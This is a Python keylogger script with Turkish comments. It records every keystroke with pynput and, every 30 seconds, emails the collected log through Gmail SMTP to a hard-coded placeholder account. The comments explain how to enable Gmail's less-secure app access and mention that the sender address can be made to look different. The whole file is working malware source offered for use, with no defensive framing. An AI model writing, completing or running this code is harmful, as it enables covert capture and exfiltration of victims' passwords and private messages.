#Program calismaya basladigi anda ilk log kaydini gonderecegi icin ilk gelen mail bos olabilir. Ilk mailden sonra keylogger sikintisiz calisacaktir
import pynput.keyboard
import smtplib #Mail yollamak icin kullanilir
import threading
log = ""
def callback_function(key):
    global log #fonksiyon disinda olusturulmus log degiskenini kullan anlamina gelir
    try:
        log += str(key.char) #key.char degeri bize direkt olarak karakteri verir
    except AttributeError:
        if key == key.space:#bu kontrolun sebebi ozel klavye tuslari girilince(space, esc vb.) script'in cokmemesini ve girilen bu ozel karakterleri algilamasini saglamaktir.
            log += " "
        else:
            log += str(key)#key.char yapilinca direkt olarak karakteri verir ve enter gibi tab gibi karakterlerde bu durum hataya yol acar
    except:
        pass
    print(log)
#Bu islemin gerceklesmesi icin veri gonderilecek olan gmail hesabinda guvenlik sekmesi altinda
#Daha az guvenli uygulama erisimi seceneginin acik olamsi gereklidir aksi halde script calismayacaktir.
def send_email(email,password,message):#Verileri gonderebilmek icin gmail'in server adresi ve port numarasinin yazilmasi gerekir
    email_server = smtplib.SMTP("smtp.gmail.com",587)#Gmailden farkli bir posta ile verileri gondericekseniz port ve adresi degistirmeniz gereklidir.
    email_server.starttls()#Guvenli baglanti icin gmail'in gerekli gordugu bir baglanti sekli
    email_server.login(email,password)
    #Send mail= hangi adresten hangi adrese gidecegini ve ne yollayacagi degerlerini alir.Mail farkli adresten geliyormus gibi de gosterilebilir.
    email_server.sendmail(email,email,message)
    email_server.quit()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)#Klavyeye basildiginda bir dinleyici olustur anlamina gelir
#on_press = klavyede basilan tusu algilar
#fonksiyon calistirilmiyor sadece referans veriliyor. Yani fonksiyon adinin sonunda () yok

def thread_function():
    global log
    #Gmail adresinizi ve sifrenizi giriniz
    send_email("kullaniciadi@gmail.com", "sifre", log.encode("utf=8"))#Log kaydina turkce karakterleri yollayabilmesi icin utf-8 yapilir
    log = ""
    timer_object = threading.Timer(30,thread_function)#Hangi isin kac saniyede bir yapilacagini gosterir
    timer_object.start()

with keylogger_listener:#program kapatilana kadar surekli dinlenilmeye devam eder
    thread_function()
    keylogger_listener.join()
